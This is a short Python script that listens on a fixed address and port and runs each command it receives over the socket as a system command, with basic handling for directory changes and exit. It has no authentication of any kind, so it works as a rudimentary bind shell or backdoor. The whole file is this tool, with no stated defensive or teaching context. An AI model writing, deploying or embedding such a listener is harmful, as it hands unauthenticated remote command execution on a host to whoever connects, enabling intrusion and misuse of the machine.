import socket, struct, threading, subprocess, shlex, os

SERVER = '192.168.1.10'
PORT = 9999
ADDR = (SERVER, PORT)

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind(ADDR)

def handle_cmd(cmd):
    try:
        command = subprocess.run(shlex.split(cmd), text=True, capture_output=True, check=True)
        print(command.stdout)
    except Exception as e:
        print(f'ERROR: {e}')


def handle_client(conn, addr):
    print(f'Server Is Listen On {SERVER}\n')
    print(f'[{addr}]')
    print('#' * 70)

    while True:
        cmd = conn.recv(2048).decode('utf-8')
       
        if cmd.startswith('cd'):
            path = shlex.split(cmd)[1]

            if os.path.exists(path):
                if path == '':
                    pass

                os.chdir(path)
                print(os.getcwd())
            else:
                print('path don\'t exists')
            continue

        if cmd == 'exit':
            break

        handle_cmd(cmd)

    conn.close()


def start():
    server.listen(1)
    conn, addr = server.accept()
    handle_client(conn, addr)


print(f'[STARTIG]...')
start()
